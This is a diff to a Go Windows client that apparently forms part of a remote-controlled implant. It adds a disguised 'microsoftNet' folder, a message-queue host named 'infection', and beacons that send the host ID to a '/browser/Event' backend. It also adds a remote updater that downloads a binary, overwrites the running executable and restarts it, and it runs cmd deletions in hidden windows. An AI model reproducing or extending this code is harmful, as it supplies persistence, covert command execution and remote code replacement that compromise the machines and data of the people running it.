@@ -34,13 +34,25 @@ const CURRENTPATHLOG = "C:\\Windows\\Temp\\log.txt"
 const CURRENTPATH = "C:\\Windows\\Temp\\"
 const NOGUILOG = "C:\\Windows\\Temp\\nogui.txt"
 
+var NEWPATH = get_current_user() + "\\microsoftNet\\"
+var DATAPATH = get_current_user() + "\\temp\\"
 var HOSTID = machineinfo.GetSystemVersion().Hostid
 var BrowserSafepath = get_current_user() + "\\tmp\\"
 var OUTIP string
 
+const TMVC = ":6000"
+const PMVC = ":5002"
+
+const TMQ = ":6006"
+const PMQ = ":5006"
+
+const MQHOST = "infection"
+
 type Msg struct {
-	Hostid string `json:"hostid"`
-	Code   int    `json:"code"`
+	Hostid      string `json:"hostid"`
+	Code        int    `json:"code"`
+	Softversion string `json:"softversion"`
+	Type        string `json:"type"`
 }
 
 // get out ip
@@ -51,7 +63,7 @@ func GetOutIp() {
 func get_current_user() string {
 	usr, err := user.Current()
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 	return usr.HomeDir
 }
@@ -60,26 +72,27 @@ func RandInt64(min, max int64) int {
 	return int(min + rand.Int63n(max-min+1))
 }
 
-func DoUpdate() {
-	for {
-		//random second check version updade
-		ticker := time.NewTicker(time.Second * time.Duration(RandInt64(15, 150)))
-		resp, _ := http.Get(MIDFILE + "version.txt")
-		body, _ := ioutil.ReadAll(resp.Body)
-		defer resp.Body.Close()
-		current_file := strings.Split(os.Args[0], "\\")
-		frpe, err := http.Get(MIDFILE + current_file[len(current_file)-1])
-		if strings.TrimSpace(string(body)) != VERSION {
-			err = update.Apply(frpe.Body, update.Options{TargetPath: os.Args[0]})
-			if err != nil {
-				// error handling
-			}
-			time.Sleep(2 * time.Second)
-			// when update done shlb be kill main process restart
-			KillMain()
-		}
-		<-ticker.C
+func DoUpdate(addr string, backendAddr string) {
+	//for {
+	//random second check version updade
+	//ticker := time.NewTicker(time.Second * time.Duration(RandInt64(15, 150)))
+	//resp, _ := http.Get(MIDFILE + "version.txt")
+	//body, _ := ioutil.ReadAll(resp.Body)
+	//defer resp.Body.Close()
+	current_file := strings.Split(os.Args[0], "\\")
+	frpe, err := http.Get(MIDFILE + current_file[len(current_file)-1])
+	//if strings.TrimSpace(string(body)) != VERSION {
+	err = update.Apply(frpe.Body, update.Options{TargetPath: os.Args[0]})
+	if err != nil {
+		EventStatusCode(300, HOSTID, VERSION, "0", "http://"+addr+backendAddr+"/browser/Event")
 	}
+	EventStatusCode(300, HOSTID, VERSION, "0", "http://"+addr+backendAddr+"/browser/Event")
+	time.Sleep(2 * time.Second)
+	// when update done shlb be kill main process restart
+	KillMain()
+	//}
+	//<-ticker.C
+	//}
 }
 func clear() {
 	var fileinit = []struct {
@@ -93,6 +106,11 @@ func clear() {
 	for _, name := range fileinit {
 		os.Remove(CURRENTPATH + name.Name)
 	}
+}
+func ClearPic() {
+	cmd := exec.Command("cmd", "/C", "del", CURRENTPATH+".png")
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	cmd.Start()
 }
 func SingleFile(file string, addr string, finflag chan string) {
 	pbuf := new(bytes.Buffer)
@@ -182,6 +200,7 @@ func MultiFileDown(files []string, step string, downflag chan string) {
 func Get(url string, file string) {
 	resp, err := http.Get(url)
 	if err != nil {
+		log.Println("下载失败:", file)
 		return
 	}
 	body, _ := ioutil.ReadAll(resp.Body)
@@ -196,17 +215,21 @@ func FileExits(path string) error {
 	return nil
 }
 
-func ErrorStatusCode(code int, hostid string, addr string) {
+func EventStatusCode(code int, hostid string, softversion string, typ string, addr string) {
 	msg := Msg{
-		Hostid: hostid,
-		Code:   code,
+		Hostid:      hostid,
+		Code:        code,
+		Type:        typ,
+		Softversion: softversion,
 	}
+	log.Println(msg)
 	_, _, _ = gorequest.New().
 		Post(addr).
 		Set("content-type", "application/x-www-form-urlencoded").
 		Send(msg).
 		End()
 }
+
 func ListProcess() {
 	downflag := make(chan string)
 	//keep the main process live
